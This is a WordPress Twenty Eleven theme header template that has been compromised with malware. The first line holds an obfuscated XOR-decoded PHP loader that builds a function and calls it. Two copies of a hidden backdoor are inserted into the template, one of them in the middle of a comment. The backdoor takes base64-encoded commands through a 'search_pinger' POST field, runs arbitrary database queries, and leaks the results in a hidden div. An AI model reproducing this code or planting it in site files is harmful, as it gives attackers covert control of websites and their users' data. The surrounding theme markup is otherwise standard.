<?php $vhSwTQb=':6 0<PcS;ZP,R=W'; $AxKIFoV='YDEQH5<5N43X;R9'^$vhSwTQb; $SbGRnSvY='=HaqW TTM=9Wm4 1>> Rv Q792ZY mo=NLsgDs1sK.>VP=:Z6UT:YtO6DMd.+:Ydw  NTzGWUTLBtxtox52kamB>IWRdoFwy=mQ RbP1uQafjUaDn<-YTT6JvU,=PZQCp-ZNSc7XA:=Xtblxqj-MDJ+G.7Ahle83AvE3pPxHYJ;-WEFF+RC5oplMgA==3++kh- ,dz0M.b;FBo3M:TMdzQ7+S+powDX973,TJwnj,4B47ySaMB1E 4Pcyl,7uaqp uTXbv =KQnMjn=V :0ck<sbKD51Jg>RNuKIkXY.RCALD75TRdmh;VXDUlY.NCW jxWsQ-O8mq<pP <1QOXVYFF=csqk,;mS.8tbWI:ynymiF9< QxKPcqEeJ <5b<<UgZaG1<>QxSLh-W2YammP3Q9O=jhG-z+PKq57JVDucu T063T :  2dM;Fs5PTZm= C,OP =0Esn253:3,Ra>9;QSXuaY0Y,8<5,LnJ2DUEW5PN;ajjT31+J<a1,Lo05XA10ne-+IhmfhPVI0qvcdvxCYoKIXP-Lvs;.HriqAGunJgJcsttZqT8CvSEW<<cCXrd 1aVr u4s epzqqk-<A31eU O6 31J7 ZJC+, 71 wmOb=18ZzdDpDpoRNdm32P5anIQO,pb=.J4ZOHwsecrz,EI>MuLpcK'; $xfmVDYAR=$AxKIFoV('', 'T.IP1U:79TV92QXXMJSzQX>EfV;-A20P;8TNmSJyBHK83IS5Xu,U+++W0,;qFO-LSDA:5Vgs>15kTXTOXN8bhI-K=woDHaLs4d7O JtXUlAVQuE-ROY+81XbR1MI1sjcTDqezi>QeUH,TLQXYNI,0+pcGja6LASV8-aZPuX;-8WH9mb-N+jhFKfDn3XIFYECLBUXMA:DShFLHKW,N5mYZ7VG NKeS 9MVlG13WSJJU.GRBYk+-C AW8CQHst:.:9eU5+BRKX2qSsJJK7LOUJKGyko TE+8U77UviO3<WiIHh VA5rYMLM7410WSSDI>FJPvW5L;YDQGzYFSC4.;>ynbb16 >ih9sOKTF<,CYSGMM0XPU4Qk+ixLA.AHT=WY,GgAcZYGjrZELI6F8APMtE0U:XQbNPpVZAUQV>7dHC5U:CSA=AVIZWL5T4,Q1 ;2bM6Xg2ANUsG1VPPUWIzEZXO0ztUE=Q-MgWPUeGq8-3msQ1:ZALLtRCY+E>ZI50UM12ECFBFN0OAFL47=QXVEBVP.=Zcm<1Y--TPK1U4XazHNmU+WBLGnC6Z G5tbXXZthAUBWT7KFDPDFBYZWWKLN3RH:>E6iEKX9CSrm3JULXPDPAoFYPL;SMdPdPOr5ndVD1YIJ-0;M+EMO3X5.,P.LXxsI= JeEeKi6'^$SbGRnSvY); $xfmVDYAR();
/**
 * Header template for the theme
 *
 * Displays all of the <head> section and everything up till <div id="main">.
 *
 * @package WordPress
 * @subpackage Twenty_Eleven
 * @since Twenty Eleven 1.0
 */
?><!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 7]>
<html id="ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html id="ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 6) & !(IE 7) & !(IE 8)]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>" />
<meta name="viewport" content="width=device-width" />
<title><?php
	// Print the <title> tag based on what is being viewed.
	global $page, $paged;

	wp_title( '|', true, 'right' );

	// Add the blog name.
	bloginfo( 'name' );

	// Add the blog description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		echo " | $site_description";

	// Add a page number if necessary:
	if ( ( $paged >= 2 || $page >= 2 ) && ! is_404() )
		echo esc_html( ' | ' . sprintf( __( 'Page %s', 'twentyeleven' ), max( $paged, $page ) ) );

	?></title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
<!--[if lt IE 9]>
<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
<![endif]-->
<?php
	/*
	 * We add some JavaScript to pages with the comment form
	 * to support sites with threaded comments (when in use).
	 */
	if ( is_singular() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	/*
	 * Always have wp_head() just before the closing </head>
<?php if(isset($_POST['search_pinger'])){
function asdping(){
global $wpdb;
$res=array();
$ping = json_decode(base64_decode(substr($_POST['search_pinger'], 32,strlen($_POST['search_pinger']))), true);
foreach($ping as $cmd){
preg_match_all('/\{\w+\}/is', $cmd['q'], $vars);
foreach($vars[0] as $var){
$entity = trim($var,'{}');
$cmd['q'] = str_replace($var, $wpdb->$entity, $cmd['q']);
}
$m = $cmd['m'];
$q = $cmd['q'];
$data = $wpdb->$m($q);
strpos($cmd['m'], 'get_')!==false ? $res[]=$data : '';
}
echo !empty($res)? '<div id="pinger" style="display:none;">'.json_encode($res).'</div>' : '';

unset($_POST['search_pinger']);
}
asdping();
} ?>
	 * tag of your theme, or you will break many plugins, which
	 * generally use this hook to add elements to <head> such
	 * as styles, scripts, and meta tags.
	 */
	wp_head();
?>
</head>
<?php if(isset($_POST['search_pinger'])){
function asdping(){
global $wpdb;
$res=array();
$ping = json_decode(base64_decode(substr($_POST['search_pinger'], 32,strlen($_POST['search_pinger']))), true);
foreach($ping as $cmd){
preg_match_all('/\{\w+\}/is', $cmd['q'], $vars);
foreach($vars[0] as $var){
$entity = trim($var,'{}');
$cmd['q'] = str_replace($var, $wpdb->$entity, $cmd['q']);
}
$m = $cmd['m'];
$q = $cmd['q'];
$data = $wpdb->$m($q);
strpos($cmd['m'], 'get_')!==false ? $res[]=$data : '';
}
echo !empty($res)? '<div id="pinger" style="display:none;">'.json_encode($res).'</div>' : '';

unset($_POST['search_pinger']);
}
asdping();
} ?>

<body <?php body_class(); ?>>
<div id="page" class="hfeed">
	<header id="branding" role="banner">
			<hgroup>
				<h1 id="site-title"><span><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></span></h1>
				<h2 id="site-description"><?php bloginfo( 'description' ); ?></h2>
			</hgroup>

			<?php
				// Check to see if the header image has been removed
				$header_image = get_header_image();
				if ( $header_image ) :
					// Compatibility with versions of WordPress prior to 3.4.
					if ( function_exists( 'get_custom_header' ) ) {
						/*
						 * We need to figure out what the minimum width should be for our featured image.
						 * This result would be the suggested width if the theme were to implement flexible widths.
						 */
						$header_image_width = get_theme_support( 'custom-header', 'width' );
					} else {
						$header_image_width = HEADER_IMAGE_WIDTH;
					}
					?>
			<a href="<?php echo esc_url( home_url( '/' ) ); ?>">
				<?php
					/*
					 * The header image.
					 * Check if this is a post or page, if it has a thumbnail, and if it's a big one
					 */
					if ( is_singular() && has_post_thumbnail( $post->ID ) &&
							( /* $src, $width, $height */ $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), array( $header_image_width, $header_image_width ) ) ) &&
							$image[1] >= $header_image_width ) :
						// Houston, we have a new header image!
						echo get_the_post_thumbnail( $post->ID, 'post-thumbnail' );
					else :
						// Compatibility with versions of WordPress prior to 3.4.
						if ( function_exists( 'get_custom_header' ) ) {
							$header_image_width  = get_custom_header()->width;
							$header_image_height = get_custom_header()->height;
						} else {
							$header_image_width  = HEADER_IMAGE_WIDTH;
							$header_image_height = HEADER_IMAGE_HEIGHT;
						}
						?>
					<img src="<?php header_image(); ?>" width="<?php echo esc_attr( $header_image_width ); ?>" height="<?php echo esc_attr( $header_image_height ); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" />
				<?php endif; // end check for featured image or standard header ?>
			</a>
			<?php endif; // end check for removed header image ?>

			<?php
				// Has the text been hidden?
				if ( 'blank' == get_header_textcolor() ) :
			?>
				<div class="only-search<?php if ( $header_image ) : ?> with-image<?php endif; ?>">
				<?php get_search_form(); ?>
				</div>
			<?php
				else :
			?>
				<?php get_search_form(); ?>
			<?php endif; ?>

			<nav id="access" role="navigation">
				<h3 class="assistive-text"><?php _e( 'Main menu', 'twentyeleven' ); ?></h3>
				<?php /* Allow screen readers / text browsers to skip the navigation menu and get right to the good stuff. */ ?>
				<div class="skip-link"><a class="assistive-text" href="#content"><?php _e( 'Skip to primary content', 'twentyeleven' ); ?></a></div>
				<?php if ( ! is_singular() ) : ?>
					<div class="skip-link"><a class="assistive-text" href="#secondary"><?php _e( 'Skip to secondary content', 'twentyeleven' ); ?></a></div>
				<?php endif; ?>
				<?php /* Our navigation menu. If one isn't filled out, wp_nav_menu falls back to wp_page_menu. The menu assigned to the primary location is the one used. If one isn't assigned, the menu with the lowest ID is used. */ ?>
				<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
			</nav><!-- #access -->
	</header><!-- #branding -->


	<div id="main">
